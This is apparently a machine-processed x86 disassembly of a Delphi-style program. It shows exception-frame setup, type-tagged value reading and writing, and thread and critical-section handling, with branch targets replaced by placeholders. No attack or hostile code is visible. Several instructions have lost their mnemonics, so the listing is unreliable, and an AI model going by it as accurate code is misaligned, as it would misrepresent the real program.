jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c080
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41c03f
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41a2bc
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a9c
call sub_403af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c080
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_4032e8
sub_41c0ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c156
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41c129
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c368
cmp al 0xb
je r-xdata
mov eax ebx
call sub_413e14
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41a404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a43c
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c15d
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c18c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41c18c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41a92c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404128
mov eax esi
call j_sub_404504
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41a92c
pop edx
pop esi
pop ebx
retn
sub_41c1c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c275
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a908
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41c284
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4042c0
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c27c
lea eax [ ebp - 0x8 ]
call sub_404718
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41c368
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41a92c
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404684
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41a92c
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41a92c
jmp r-xdata
jmp r-xdata
call sub_41a404
sub_41c284
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c35b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a908
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41c1c8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404864
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c362
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404038
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41c368
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41a92c
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404960
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41a92c
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41a92c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404684
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41a92c
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405cf8
jmp r-xdata
jmp r-xdata
call sub_41a404
sub_41c37c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c3b8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41c18c
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3bf
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41c3c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41a5c4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c478
mov eax [ ebx ]
call sub_41b530
pop ebx
pop ebp
retn
sub_41c3ec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41a92c
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c870
pop ebx
pop ecx
pop ebp
retn
sub_41c41c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41a5c4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41a908
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41b530
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41c870
jmp r-xdata
mov eax [ ebx ]
call sub_41c478
mov eax [ ebx ]
call sub_41a5c4
test al al
je r-xdata
mov eax [ ebx ]
call sub_41c614
mov eax [ ebx ]
call sub_41b530
sub_41c478
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c607
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c368
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c60e
lea eax [ ebp - 0x8 ]
call sub_404038
retn
jmp [ eax * 4 + jump_table_41c4af ]
push ebp
call sub_41c3c4
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c18c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41c3ec
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c37c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41c3ec
pop ecx
jmp r-xdata
push ebp
call sub_41c41c
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
push ebp
mov eax 0x2
call sub_41c3ec
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41c870
jmp r-xdata
push ebp
mov eax 0x1
call sub_41c3ec
pop ecx
sub_41c614
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c651
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41c18c
mov eax ebx
call sub_41c478
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c658
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41c65c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41c6f4
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41a5c4
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41c18c
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41c18c
jmp r-xdata
mov eax ebx
call sub_41c614
mov eax ebx
call sub_41b530
jmp r-xdata
mov eax ebx
call sub_41a5c4
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41c65c
mov eax ebx
call sub_41b530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c6fb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
sub_41c704
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c7a9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040d0
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41d5a0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7b0
lea eax [ ebp - 0x8 ]
call sub_404038
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
sub_41c7d4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41c7fc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41a85c
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_416c10
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403514
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41a85c
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41c870
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41a92c
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41a92c
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41c8b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ca61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41a490
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ca3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41a92c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41936c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41a92c
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419d4c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ca17
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41c1c8
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41a92c
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41936c
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41a92c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_413ab4
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
lea eax [ ebp - 0x1c ]
call sub_405928
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d1c0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca1e
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub_41ca80
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41cc7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40edb8
mov eax [ ebp - 0x4 ]
call sub_41a908
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
jmp [ eax * 4 + jump_table_41cac2 ]
mov eax [ ebp - 0x4 ]
call sub_41c368
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b478
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_412f20
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b478
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_412f20
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b478
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_412f20
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b25c
mov eax ebx
call sub_413118
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b2a0
mov eax ebx
call sub_413118
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b2e4
mov eax ebx
call sub_413140
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b334
mov eax ebx
call sub_41312c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c1c8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_413154
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c284
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413180
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c368
cmp al 0x9
sete dl
mov eax ebx
call sub_4130f0
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41c8b8
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f0e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b4e4
push edx
push eax
mov eax ebx
call sub_41301c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc81
lea eax [ ebp - 0x1c ]
call sub_40edcc
lea eax [ ebp - 0xc ]
call sub_404718
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax ebx
call sub_413b9c
jmp r-xdata
sub_41cc88
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41ccd4
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41cd00
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41ce70
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cc88
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41ce70
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41cc88
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41ce70
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41cc88
jmp r-xdata
pop edx
pop ebx
retn
sub_41cd84
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404444
je r-xdata
mov eax esi
call sub_4042f8
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4042f8
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41ce70
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cc88
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41cc88
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41ce70
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cc88
mov dl 0x6
mov eax ebx
call sub_41ce70
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41cc88
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41cc88
sub_41ce1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ce61
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d9c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41cd84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce68
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_41cef8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
call sub_41ced0
mov eax ebx
call sub_41cedc
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d086
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d067
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d06e
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_417570
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_417460
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41d031
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d002
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41d098
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41d250
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41d0e4
push ebx
push esi
push ecx
call sub_403674
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41d338
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41d2e0
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_417ae8
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41d2a8
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40365c
lea eax [ ebx + 0x14 ]
call sub_40d18c
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_417570
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41d168
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4175cc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_417414
mov edx ebx
mov eax esi
call sub_41d168
sub_41d1fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_417414
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x10 ] eax
sub_41d228
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4176b4
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4032e8
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41d250
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4034e4
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41d1fc
mov dl 0x1
mov eax ebx
call sub_41d770
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41d720
sub_41d2a8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41d770
mov edx ebx
mov eax esi
call sub_41d228
pop edi
pop esi
pop ebx
retn
sub_41d2e0
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_417658
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41d2a8
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41d228
sub_41d338
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_417570
call sub_41d338
inc edi
dec esi
jne r-xdata
sub_41d374
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4176b4
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4032e8
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41d398
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41d374
mov edx ebx
mov eax esi
call sub_41d374
pop esi
pop ebx
retn
sub_41d3b4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41d398
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_417570
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41d410
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41d1bc
push ebx
push sub_41d1e4
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41d1d0
push ebx
push sub_41d1f0
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41d508
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
